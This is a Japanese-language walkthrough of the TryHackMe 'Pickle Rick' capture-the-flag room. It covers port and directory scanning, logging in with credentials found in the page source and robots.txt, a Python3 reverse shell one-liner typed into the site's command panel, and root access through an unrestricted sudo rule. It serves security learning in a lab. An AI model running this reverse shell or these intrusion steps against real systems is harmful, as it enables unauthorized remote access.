# Pickle Rick | TryHackMe
> A Rick and Morty CTF. Help turn Rick back into a human!

level -> Easy

使ったツール･コマンド
1. nmap
2. gobuster
3. python3
4. netcat

まずはIPを設定しておく

`export IP=machine_ip_adress`

#### Task1, What is the first ingredient that Rick needs?
ピクルスを人間に戻すための素材を見つけるらしい(?
どのポートが空いているのか確認

`nmap -sV -sC $IP`

結果をみると80と22が空いているらしいので80を見に行く
いろいろあるがページのソースを見てみる
丁寧にユーザーネームが書いてある

`Username: R1ckRul3s`

先程のユーザーネームを打つところを探す
gobusterで他のものを探す

`gobuster dir -w common.txt -u http://$IP -x php,html,txt`

robots.txtとportal.phpを見つけた
robots.txtには意味不明な文字列

`Wubbalubbadubdub`

portal.phpはなにかのログイン画面のよう
ユーザーネームはさっきの奴だとして、パスワードらしきもの見つからなかったのでrobots.txtの文字列をパスワード代わりに使ってみる

```
username: R1ckRul3s
password: Wubbalubbadubdub
```

初見でこれがパスワードってわかった人凄すぎる(はじめは知らんかった
さっそくページのソースを見てみる
意味深なBase64を発見

` Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

これは全く関係ないが気になる人は7回重ねてデコードしてみるといい(まじでおすすめ
とりあえずリバースシェルを試してみる(Python3で
別の端末を開いてnetcatでリッスンしておく
自分でPORTの部分はせていしてね

`nc -lnvp PORT`

下のpython3をCommand Panelに打つ
IPADDRESSとPORTは自分で設定してね

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`

つながったらlsしてみる

`ls -la`

Sup3rS3cretPickl3Ingred.txtが気になったのでcatで見てみる

`cat Sup3rS3cretPickl3Ingred.txt`

1つ目の素材をつけた
##### *mr. meeseek hair*

#### Task2, What is the second ingredient in Rick’s potion?
ポーションの素材を探す
とりあえずホームディレクトリに移動して誰がいるのか確認

`cd /home`

rickを見つけたのでrickのホームディレクトリに移動してlsしてみる

`cd rick ; ls -la`

second ingredientsを見つけたのでcatで見てみる

`cat second\ ingredients`

2つ目の素材を見つけた
##### *1 jerry tear*

#### Task3, What is the last and final ingredient?
3つ目を探す
最後なので/rootにあるだろうから権限を昇格する
sudoできるコマンドがあるか調べる

`sudo -l`

(ALL) NOPASSWD: ALLだそうです(勝ちです
とりあえずrootになっておく

`sudo su`

これで/rootに移動できるようになったので移動

`cd /root`

移動できたらlsしてみる

`ls -la`

3rd.txtをcatする

`cat 3rd.txt`

3つ目の素材を見つけた
##### *fleeb juice*

これでこのルームは終わり
このルームで見つけた素材3つでピクルスを人間に戻せるらしいです(?
